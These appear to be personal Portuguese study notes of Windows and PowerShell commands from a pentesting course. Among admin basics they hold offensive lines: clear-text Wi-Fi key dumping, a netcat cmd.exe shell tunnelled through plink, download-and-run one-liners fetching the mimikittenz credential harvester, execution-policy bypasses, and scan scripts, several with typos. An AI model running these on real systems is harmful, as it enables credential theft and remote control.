# windows comandos
- netsh wlan show profile
- netsh wlan show profile <SSID> key=clear

  # erro virtualbox

- bcdedit
- bcdedit /set hypervisorlaunchtype off

# Docker wsl 2
- wsl.exe --list --all
- wsl --set-version Ubuntu-20.04 2
--------------
# tunelamento windows

c:\>nc.exe -vnlp 4444 -s 127.0.0.1 -e cmd.exe
outro commad
c:\>plink.exe -ssh -l usuario -pw senha -R 192.168.0.2:1337:127.0.0.1:4444 192.168.0.2 
kali (1337 vai ser a porta aberta direcionada 4444)
subir SSH porta 22

nc -v 127.0.0.1 1337
--------------------------
- whoami
- whoami /groups
- net user desec
- net user
- hostname
- systeminfo
- systeminfo | findstr "OS Name"
- systeminfo | findstr /C:"Os Name"
- tasklist.exe
- tasklist.exe /SVC
- ipconfig /all
- arp -a
- route print 
- netstat -amo
- sc query windefender
- netsh advfirewall show currentprofile
- where /R c:\ web.txt
- findstrg /s "pass=" *.txt
- type arquivo.txt
- systeminfo > arquivo.txt
- powershell -c "wget http://ahhaha/arquivo.php -Outfile arquivo.php
- c>\ runas /user:usuario cmd
- echo ""
- Write-Host ""
- Write-Output ""
- notepad script.ps1
- Get-Location
- echo "diretorio atual: $(Get-Location)"
- $ip = "ip"
- echo "aggaga " $ip
- Read-host "Digite jjj"
- #comentario
- .\script.ps1
- Write-Host "eu: $(whoami)"
- pwd
- $ip = "192.168.1.1"
- $ip = Read-host "Digite o IP:"
- echo "varendo o host: $ip"
- ping -n 1 8.8.8.8 | Select-String "bytes=32"
- Get-Command | Select-String Test
- Get-Help Test-NetConnection
- Test-NetConnection site
- Test-NetConnection site -TraceRoute
- Test-NetConnection site -TraceRoute -Hop 1
- Test-NetConnection site -Port 80
- Test-NetConnection site -Port 80 -WarningAction SilentlyContinue -InformationLevel Quiet
- 1..10
- Invoke-WebRequest site
- Invoke-WebRequest site -OutFile arquivo.txt
- Invoke-WebRequest site -Method head
- Invoke-WebRequest site -Method options
- (Invoke-WebRequest site).statuscode
- (Invoke-WebRequest site).content
- (Invoke-WebRequest site).links
- (Invoke-WebRequest site).links.href
- (Invoke-WebRequest site).headers
- (Invoke-WebRequest site).headers.server
- - foreach ($ip in 1..255) {echo "192.168.0.$ip"}
- foreach ($ip in cat .\TESTE) {echo "192.168.0.$ip"}
- Get-ExecutionPolicy
- Get-ExecutionPolicy -List | Format-Table -AutoSize
- Set-ExecutionPolicy Restricted
- Echo Write-Host  "Minha voz é meu passaporte, me verifique."   | O PowerShell. exe  -noprofile -
- Get-Content .\script.ps1 | PowerShell.exe  -noprofile -
- TYPE .\script.ps1 | PowerShell.exe -noprofile -
- powershell -nop -c  "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
- powershell -nop -c  "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/orlyjamie/mimikittenz/master/Invoke-mimikittenz.ps1')"
- Powershell -command "Write-Host 'My voice is my passport, verify me.'"
- Powershell -c "Write-Host 'My voice is my passport, verify me.'"
- $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand
- [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
- powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA
- invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}
- PowerShell.exe -ExecutionPolicy Bypass -File .\script.ps1
- GC .\script.ps1 | iex
- Get-Content .\script.ps1 | Invoke-Expression
- PowerShell.exe -ExecutionPolicy UnRestricted -File .\script.ps1

- function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  .\script.ps1

- Set-ExecutionPolicy Bypass -Scope Process
- Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
- HKEY_CURRENT_USERSoftwareMicrosoftPowerShell1ShellIdsMicrosoft.PowerShell          # persistente - (Unrestricted)

---------- 
# script.ps1 IP
- param($p1)
- if (!$p1){
-    echo "nao teve argumento"
-	 echo "use assim"
- } else {
- foreach ($ip in 1..254){
- ping -n 1 "$p1.$ip" | select-string "bytes=32"
- }
- }
-----------
- $idade = read-host "qual idade"
- if ($idade -ge "18){
-  echo "pde"
- }else{
-  echo "nao pode"
- }
-----------
- try {$resp = ping -n 1 "$p1.$ip" | select-string "bytes=32"
- $resp.Linesplit(' ')[2] -replace ":",""
- } catch{}
- }
--------------
- param($ip,$porta)
- if(!ip -or !$porta){
-     echo "aaaaaaa"
- 	echo "use assim"
- } else {
- if (Test-NetConnection $ip -TraceRoute site -Port $porta -WarningAction SilentlyContinue -InformationLevel Quiet) {
-     echo "Porta Aberta"
- } else {
-     echo "porta Fechada"
- }
- }
--------------
- param($ip)
- if(!ip){
-     echo "aaaaaaa"
- 	echo "use assim"
- } else { 
- foreach ($porta in 1..65000){
- if (Test-NetConnection $ip -TraceRoute site -Port $porta -WarningAction SilentlyContinue -InformationLevel Quiet) {
-     echo "Porta $porta Aberta"
- }} else {
-     echo "porta $porta Fechada"
- }
- }
---
- $topports = 21,22,3306,443
- try {foreach ($porta in $topports){
- }} catch{}
----------
- $site = Read-Host "Digite o site"
- $web = Invoke-WebRequest -uri "$site" -Method options
- echo "O servidor roda: "
- $web.headers.server
- echo ""
- echo "o servidor aceita os metodos: "
- $web.headers.allow
- echo ""
- echo "Links encontrados: "
- $web2 = Invoke-WebRequest -uri "$site"
- $web2.links.href | select-string http://
-------------------

